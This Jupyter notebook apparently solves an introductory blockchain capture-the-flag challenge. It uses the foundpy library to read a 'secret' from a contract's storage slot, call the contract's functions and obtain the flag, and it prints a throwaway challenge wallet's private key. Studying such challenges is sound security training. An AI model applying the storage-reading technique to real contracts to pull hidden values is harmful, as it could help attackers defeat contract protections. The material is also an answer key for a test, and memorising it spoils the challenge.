{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [],
   "source": [
    "from foundpy import *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "session already found, skipping PoW...\n",
      "UUID: e3a59fc1-879d-4858-99af-28c8db1124cb\n",
      "RPC Endpoint: http://103.178.153.113:30001/e3a59fc1-879d-4858-99af-28c8db1124cb\n",
      "Private Key: 0xfce5e1f62e5ca627376420316261bb74d18d69787711add38a130ff791e8852f\n",
      "Setup Contract: 0xd65aAAA252E193D5c2c999D88FaF9616D7a1Bad7\n",
      "Wallet: 0x297C8bB61eB70F63fc03b9fb7AeE0c7E43eeedD6\n",
      "Message: your private blockchain has been deployed, it will automatically terminate in 30 minutes\n"
     ]
    }
   ],
   "source": [
    "result = config.from_tcp1p(\"http://103.178.153.113:30001\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [],
   "source": [
    "config.change_solc_version(\"0.8.25\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [],
   "source": [
    "setup = Contract(result[\"setup_contract\"], \"Setup.sol\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "False"
      ]
     },
     "execution_count": 48,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "setup.call(\"isSolved\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [],
   "source": [
    "briefing = Contract(setup.call(\"brief\"), \"Briefing.sol\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HexBytes('0x60db5c2b50562210450b3a45b257b98b30cb7199269b6e12449d9ccd3f8b85f2')"
      ]
     },
     "execution_count": 50,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "briefing.send(\"verifyCall\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HexBytes('0xe95ed69cf5a11286019eb2ae71362cabd2ecd931f1820c7f43aa006571a76976')"
      ]
     },
     "execution_count": 51,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "briefing.send(\"firstDeposit\", value=int(5 * 10**18))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HexBytes('0xfd707e0bbc840f3d4d6db2efd5df6290172228b66f5606f66fe6362fbb293dbd')"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "briefing.send(\"putSomething\", 1337, \"Casino Heist Player\", config.wallet.address)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0xE593d19D36EbfAE0cF183D73Dd74568b84621362'"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "briefing.address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'NowYouKnowStorageIsNotThatSafe..'\n"
     ]
    }
   ],
   "source": [
    "# secret = bytes.fromhex(\"4e6f77596f754b6e6f7753746f7261676549734e6f7454686174536166652e2e\")\n",
    "secret = briefing.storage(0)\n",
    "print(secret)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1922215132079289491\n"
     ]
    }
   ],
   "source": [
    "print(config.wallet.get_balance())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HexBytes('0x37dfdd042b183707234566842c94e832a9a30c253ec2b83f188c3290f80706b7')"
      ]
     },
     "execution_count": 56,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "config.wallet.send(briefing.address,int(1 * 10**18))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HexBytes('0xafd91147f1b907dbce2e2ce7fe0bca572be4be8f905b5abeeddff2234cde1ea3')"
      ]
     },
     "execution_count": 57,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "briefing.send(\"Finalize\", secret)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 58,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "setup.call(\"isSolved\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'ENUMA{Briefing_completed!_Now_Gearing_up!}'"
      ]
     },
     "execution_count": 59,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "config.flag()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
